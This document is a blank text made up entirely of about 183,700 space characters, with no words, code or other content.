                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      